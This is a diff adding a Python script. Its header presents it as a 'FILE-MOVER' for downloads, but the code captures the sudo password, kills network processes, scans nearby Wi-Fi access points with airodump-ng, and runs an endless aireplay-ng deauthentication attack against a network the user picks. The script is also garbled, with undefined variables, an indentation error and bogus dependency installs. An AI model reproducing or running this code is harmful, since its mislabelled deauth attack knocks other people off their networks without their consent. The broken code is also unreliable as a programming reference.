@@ -1,0 +1,476 @@
+import subprocess, re, csv, os, time, shutil, sys, getpass, traceback, platform, time, threading
+from datetime import datetime
+from subprocess import Popen, call, PIPE
+import IPCHECKER as IPx
+from tqdm import tqdm
+from getpass import getpass
+from os import devnull
+
+
+
+class Spinner:
+    busy = False
+    delay = 0.1
+
+    @staticmethod
+    def spinning_cursor():
+        while 1:
+            for cursor in '|/-\\': yield cursor
+
+    def __init__(self, delay=None):
+        self.spinner_generator = self.spinning_cursor()
+        if delay and float(delay): self.delay = delay
+
+    def spinner_task(self):
+        while self.busy:
+            sys.stdout.write(next(self.spinner_generator))
+            sys.stdout.flush()
+            time.sleep(self.delay)
+            sys.stdout.write('\b')
+            sys.stdout.flush()
+
+    def __enter__(self):
+        self.busy = True
+        threading.Thread(target=self.spinner_task).start()
+
+    def __exit__(self, exception, value, tb):
+        self.busy = False
+        time.sleep(self.delay)
+        if exception is not None:
+            return False
+
+
+class Colors:
+    reset = "\033[0m"
+
+    # Black
+    fgBlack = "\033[30m"
+    fgBrightBlack = "\033[30;1m"
+    bgBlack = "\033[40m"
+    bgBrightBlack = "\033[40;1m"
+
+    # Red
+    fgRed = "\033[31m"
+    fgBrightRed = "\033[31;1m"
+    bgRed = "\033[41m"
+    bgBrightRed = "\033[41;1m"
+
+    # Green
+    fgGreen = "\033[32m"
+    fgBrightGreen = "\033[32;1m"
+    bgGreen = "\033[42m"
+    bgBrightGreen = "\033[42;1m"
+
+    # Yellow
+    fgYellow = "\033[33m"
+    fgBrightYellow = "\033[33;1m"
+    bgYellow = "\033[43m"
+    bgBrightYellow = "\033[43;1m"
+
+    # Blue
+    fgBlue = "\033[34m"
+    fgBrightBlue = "\033[34;1m"
+    bgBlue = "\033[44m"
+    bgBrightBlue = "\033[44;1m"
+    # Magenta
+    fgMagenta = "\033[35m"
+    fgBrightMagenta = "\033[35;1m"
+    bgMagenta = "\033[45m"
+    bgBrightMagenta = "\033[45;1m"
+    # Cyan
+    fgCyan = "\033[36m"
+    fgBrightCyan = "\033[36;1m"
+    bgCyan = "\033[46m"
+    bgBrightCyan = "\033[46;1m"
+    # White
+    fgWhite = "\033[37m"
+    fgBrightWhite = "\033[37;1m"
+    bgWhite = "\033[47m"
+    bgBrightWhite = "\033[47;1m"
+
+
+###########
+color = Colors()
+spinner = Spinner()
+yellow = color.fgYellow
+red = color.fgRed
+blue = color.fgBlue
+bblue = color.fgBrightBlue
+cyan = color.fgCyan
+bg_background = color.bgBlack
+reset = color.reset
+
+
+############
+
+
+def display_header():
+    # print('*' * 75)
+    color_red = Colors()
+    global red0
+    red0 = color_red.fgRed
+    global reset0
+    reset0 = color_red.reset
+
+    x = 'x'
+    print(f"{'X' * 125:^70}")
+    print(f"{'X' * 125:^70}")
+    pretty = f'{red0}xxx FILE-MOVER xxx{reset0}'.center(width)
+    print(f'{pretty : ^70}')
+    print(f"{'X' * 125: ^70}")
+
+    one = (
+        f'[USAGE] - [1] This is a python program that takes a specified file names, and moves them into an individual folder.')
+    two = (
+        f'[USAGE] - [2] The program works well with most download repositories, and currently gets around security measure implimented by \n[USAGE] - [2]b 1337x.to, itorrent && archive.org')
+    three = (
+        f'[USAGE] - [3] Download a LINK GRABBING extension from chrome, to pull the URLs off of the browsers tabs.')
+    four = (f'[USAGE] - [4] Save the list into download_list.txt (Found in the Directory as this program')
+    five = (
+        f'[USAGE] - [5] Wait for downloads. Archive.org may be slow. The program saves both a LIST and DICT for further usage. (see functions)')
+    six = (f'[SYSTEM] copyright material from Adel Al-Aali [SYSTEM]')
+
+    print(f"{one:^70}")
+    print(f"{two:^70}")
+    print(f"{three:^70}")
+    print(f"{four:^70}")
+    print(f"{five:^70}")
+    print(f"{six:^70}")
+    print(f"{x * 20: ^70}")
+    print(), print()
+
+def period_wait():
+    period = ['.', '.', '.', '.', '.', '.', '.', '.', '.', '.']
+    # multi = [2,2,2,2,2,2,2,2,2,2]
+    period_len = len(period)
+    with Spinner():
+        for z, x in enumerate(period):
+            print(x)
+            time.sleep(.2)
+            if z <= period_len:
+                z += 1
+                print(f"{yellow}{x * z}{reset}")
+                continue
+            elif z == period_len:
+                break
+
+
+def clear():
+    # check and make call for specific operating system
+    os_name = platform.system()
+    _ = call('clear' if os_name == 'Linux' or 'Windows' or 'Darwin' else 'cls')
+
+
+def install():
+    sucessfull_install = []
+    subprocess.check_call([sys.executable, "-m", "pip", "install", threading])
+    if subprocess.check_call:
+        print(f'{yellow} Sucessfully Installed PIP')
+        sucessfull_install.append('pip')
+    subprocess.check_call([sys.executable, "-m", "tqdm", "install", tqdm])
+    if subprocess.check_call:
+        print(f'{yellow} Sucessfully Installed TQDM')
+        sucessfull_install.append('TQDM')
+    subprocess.check_call([sys.executable, "-m", "pip", "datetime", datetime])
+    if subprocess.check_call:
+        print(f'{yellow} Sucessfully Installed datetime')
+        sucessfull_install.append('datetime')
+    subprocess.check_call([sys.executable, "-m", "pip", "net-tools", net-tools])
+    if subprocess.check_call:
+        print(f'{yellow} Sucessfully Installed datetime')
+        sucessfull_install.append('net-tools')
+    subprocess.check_call([sys.executable, "-m", "pip", "airmon-ng", airmon-ng])
+    if subprocess.check_call:
+        print(f'{yellow} Sucessfully Installed airmon-ng')
+        sucessfull_install.append('airmong-ng')
+    print(f'{yellow}**Installed Dependencies {reset}\n{sucessfull_install}')
+
+
+
+ACTIVE_NETWORKS = []
+# TO AVOID SSID DUPLICATIONS- #pass ssid % list
+def check_ssid(ssid, list):
+    check_status = True
+    for item in list:
+        if len(list) == 0:  # check for null in list
+            return check_status
+        elif ssid in item['essid']:
+            check_status = False # do not add to list if true
+            return check_status
+
+
+
+try:
+    print(IPx.get_ip)
+    # print(f'\033[0;35;47m \t\t[{IPx.get_ip()}]  ...? \033[0m 0;35;47m')
+    width = os.get_terminal_size().columns  # set the width to center goods
+    terminal = os.environ.get('TERM')
+    width_len = width
+    cwd = os.getcwd()
+    #  IP_INFO = f"\033[1;35;0m {IPx.IP}"
+    IP = IPx.get_ip
+
+    current_version = platform.release()
+    system_info = platform.platform()
+    os_name0 = platform.system()
+
+    ## new adds
+    big_names = platform.uname()
+    processor = platform.processor()
+    architecture = platform.architecture()
+    user_id = os.uname()
+    login = os.getlogin()
+
+    display_header()
+    print(), print()
+    print('X' * 150)
+    print('X' * 150)
+    print()
+    print(f'SYSTEM INFO'.center(width))  ### IP_INFO Is disabled due to .API usage limit.
+    print(f'\033[1;35;m [{current_version}]  ...? '.center(width))
+    print(f'\033[1;35;m [{os_name0}] + [{terminal}] ...? '.center(width))
+    print(f'\033[1;35;m [{system_info}]  ...? '.center(width))
+    print(f'\033[1;35;0m [{current_version}]  ...? '.center(width))  ### ADDD YOUR IP
+    print(f'\033[1;35;0m [{IP}]  ...? '.center(width))  ### ADDD YOUR IP
+    print(f'\033[1;35;0m [{big_names}]  ...? '.center(width))  ### ADDD YOUR IP
+    print(f'\033[1;35;0m [{processor}]  ...? '.center(width))  ### ADDD YOUR IP
+    print(f'\033[1;35;0m [{architecture}]  ...? '.center(width))  ###
+    print(f'\033[1;35;0m [{user_id}]  ...? '.center(width))  ###
+    print(f'\033[1;35;0m [{login}]  ...? '.center(width))  ###
+    print(f'\033[1;35;0m [{current_version}]  ...? '.center(width))  ### ADDD YOUR IP
+    # print(f'\033[1;35;0m [{IP_INFO}]  ...? '.center(width))  ### ADDD YOUR IP
+
+except Exception as E:
+    traceback.print_exc()
+    print(str(E))
+
+######### TO CHECK IF USER IS SU #############
+#### removes old .csv before running script.
+try: ## (try, except else)
+    with Spinner():
+        flag = True
+        while flag:
+            if not 'SUDO_UID' in os.environ.keys():
+                print('x' * 50)
+                print('[SYSTEM] Must have SU Privledges.')
+                password = getpass('* ')
+                print()
+                proc = Popen('sudo -S apache2ctl restart'.split(), stdin=PIPE, stderr=PIPE)
+                proc.communicate(password.encode())
+                if proc.communicate:
+                    print(f'**{yellow}Sudo Escalation Successful, moving on.. {reset}')
+                    flag = False
+                    break
+                else:
+                    print(f'**{red}Sudo Escalation failed, SYS.EXIT on.. {reset}')
+                    print(f'**{yellow}Try again... {reset}')
+                    continue
+except Exception as EX:
+    print(f'{red}IO ERROR - MUST BE SUPER USER()): {reset}  \n**{EX}')
+    sys.exit(1)
+
+
+
+else:
+    try:
+        with Spinner():
+            for f in os.listdir():
+                if '.csv' in f:
+                    print('x' * 50)
+                    current_files = subprocess.run(['ls', '-la'], capture_output=True, text = True) ## .stdout.decode())
+                    print(f'[SYSTEM] {current_files}')
+                    print(f'[SYSTEM] Current Files in Directory:\n {current_files}')
+                    print('[SYSTEM].csv found in directory. moving it to backup folder. ')
+                    # to get current directory
+                    directory = os.getcwd()
+                    try:
+                        os.mkdir(directory + "/backup/")
+                    except:
+                        print('Backup folder already exists')
+                    timestamp = datetime.now()
+                    #os.rename(file_name, directory + "/backup/" + str(timestamp) + '-' + file_name)
+                    shutil.move(f, directory + "/backup/" + str(timestamp) + '-' + f)
+                    ## shutil is better for this.
+    except IOError as e:
+        traceback.print_exc()
+        print(f'{red}IO ERROR in parsing listdir()): {reset}',  e)
+########################################################################################################
+########################################################################################################
+########################################################################################################
+########################################################################################################
+########################################################################################################
+## ADD LOGIC TO DETERMIN KALI / UBUNTU USING PLATFORM ##
+
+
+
+try: ## try, else except
+    interface_KALI = re.compile(r"^wlan[0-9]+")  ###### KALI LINUX
+    interface_UBUNTU = re.compile(r"^wlo[1-9]")  ##### UBUNTU
+    wifi_results = interface_UBUNTU.findall(subprocess.run(['iwconfig'], capture_output=True).stdout.decode())
+    print(f'{yellow} :: Your WIFI  :: {reset}\n*{wifi_results}')
+    print('X' * 50)
+    flag00 = True
+    while flag00:
+        if len(wifi_results) != 0:
+            print(f'{yellow} wifi_results on UBUNTU{reset}\n{wifi_results}')
+            print(f'{yellow} interface{reset}\n{interface_UBUNTU}')
+            print(f'{yellow} wifi_results on KALI{reset}\n{wifi_results}')
+            print(f'{yellow} interface{reset}\n{interface_KALI}')
+            print(), print()
+            break
+    else:
+        print(f'**{red}**Invalid Input, restarting loop {reset}')
+        print(f'**{yellow}*Enter your WIFI-NIC  {reset}')
+        enter_nic = input('* \n')
+        flag00 = True
+        continue
+
+except EOFError as EOF:
+    traceback.print_exc()
+    print(str(EOF))
+    print(f'{red}**Error, must have input{reset}')
+except Exception as e:
+    traceback.print_exc()
+    print(str(e))
+    sys.exit(1)
+
+else:
+    discover_ap = subprocess.Popen(
+        ['sudo', 'airodump-ng', '-w', 'file', '--write-interval', '1', '--output-format', 'csv',
+         nic + 'mon'], stdout=PIPE, stderr=PIPE, stdin=PIPE)
+
+    if discover_ap:
+        print(f'**{yellow}**[DISCOVERED AP]** {reset}')
+        print(discover_ap)
+    else:
+        print(f'{red}**Still waiting{reset}')
+
+    print('x' * 50)
+    print(f'{yellow}The following interfaces are available: {reset}')
+    for index, item in enumerate(wifi_results):
+        print(f'({index}, {item}')
+    flag = True
+    while flag:
+        print(f'**{yellow}Enter the interface you want to use{reset}')
+        user_iw = input('** \n')
+        try: # loop to get iw correct
+            if user_iw in wifi_results:
+                global nic
+                nic = str(wifi_results)
+                print(f'{yellow} your nic {reset}\n {nic}')
+                print(f'{yellow} {type(nic)} {reset}')
+                print(f'**{yellow}Wifi adapter now connected, staring processes.{reset}')
+                period_wait()
+                display_conflict = subprocess.run(['sudo', 'airmon-ng', 'check'])
+                if display_conflict:
+                    print(f'{yellow} :: Conflicting Subprocesses ::')
+                    print(display_conflict)
+                else:
+                    print(f'{red} :: no conflicting subprocesses ::')
+
+                kill_process = subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'])
+                if kill_process:
+                    print(f'{yellow} :: Killing System Processes ::')
+                    print(kill_process)
+                else:
+                    print(f'{red}**No subprocess to kill{reset}')
+
+                monitored_mode = subprocess.run(['sudo', 'airdump-ng', 'start', nic])
+                if monitored_mode:
+                    print(f'**{yellow}**[Monitoring Network Traffic]** {reset}')
+                    print(monitored_mode)
+                else:
+                    print(f'{red}**monitored mode failed{reset}')
+
+
+                discover_ap = subprocess.Popen(
+                    ['sudo', 'airodump-ng', '-w', 'file', '--write-interval', '1', '--output-format', 'csv',
+                     nic + 'mon'], stdout=PIPE, stderr=PIPE, stdin=PIPE)
+
+                if discover_ap:
+                    print(f'**{yellow}**[DISCOVERED AP]** {reset}')
+                    print(discover_ap)
+                else:
+                    print(f'{red}**Still waiting{reset}')
+                break
+
+            elif KeyboardInterrupt:
+                ## DISABLE MONITORED MODE
+                print(f'**{yellow}**[Killing Monitoring Process]** {reset}')
+                disable_monitor = subprocess.run(['sudo', 'airmon-ng', 'stop', nic])
+                if disable_monitor:
+                    print(f'{red}**Succesfully Killed Monitering Process{reset}')
+                    print(f'{red}*Breaking Loop{reset}')
+                    flag = False
+                    break
+            else:
+                print(f'{red}**Invalid input, restarting loop')
+                time.sleep(.2)
+                flag = True
+                continue
+
+
+        except Exception as e:
+            traceback.print_exc()
+            print(f'Exception found in USER_IW {str(e)})')
+
+## set up the porcess to run airmon ng.  do not forget to clear shell, and check if .csv load is true
+try:
+    while True:
+        subprocess.call('clear', shell = True) ## clears shell
+        for file_name in os.listdir():
+            if'attack.csv' in file_name:
+                if not 'attack.csv':
+                    print(f'{red}** Did not find a directory, searching for one.. {reset}')
+                    csv_loc = directory + 'attack.csv'
+                    print(f'{yellow}**The .csv is in: {reset} \n*{csv_loc}')
+                    file = open(csv_loc, 'w')
+
+                    ############################
+             params = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher',
+                               'Authentication', 'Power',
+                               'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'key']
+                with open('attack.csv') as csv_h:
+                    csv_h.seek(0)
+                    csv_reader = csv.DictReader(csv_h, field_names=params)
+                    for row in csv_reader:
+                        if row['BSSID'] == 'BSSID': #skip bssid, its already listed.
+                            ACTIVE_NETWORKS.append(row)
+                        elif row in ['BSID'] == 'Station MAC': ## GETS RID OF CLIENT DATA.
+                            break
+                        elif check_ssid(row['ESSID'], ACTIVE_NETWORKS):
+                            ACTIVE_NETWORKS.append(row)
+                    print(f'[SYSTEM] Scanning. Press control+ when you want to select the network you want to attack.\n' )
+                    print("No |\tBSSID              |\tChannel|\tESSID                         |")
+                    print("___|\t___________________|\t_______|\t______________________________|")
+
+                if KeyboardInterrupt:
+                    traceback.print_exc()
+                    print(f'\n{red}[SYSTEM] USER EXIT.{reset}')
+                    try:
+                        for index, item in enumerate(ACTIVE_NETWORKS):
+                                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
+                                while True:
+                                    choice = input("[SYSTEM] Please make a choice from above. ")
+                                    try:
+                                        if ACTIVE_NETWORKS[int(choice)]:
+                                            hack_ssid = ACTIVE_NETWORKS[int(choice)]["BSSID"]
+                                            hack_channel = ACTIVE_NETWORKS[int(choice)]["channel"].strip()
+                                            subprocess.run(["airmon-ng", "start", nic + "mon", hack_channel])
+                                            subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hack_ssid,
+                                            wifi_result[int(wifi_interface_choice)] + "mon"])
+                                            time.sleep(1)
+                                    except KeyboardInterrupt:
+                                        traceback.print_exc()
+                                        print(f'\n{red}[SYSTEM] USER EXIT.{reset}')
+except exception as final_error:
+    traceback.print_exc()
+    print(f'{red}**{str(final_error)}.{reset}')
+
+
+
+
+
+
+
+#
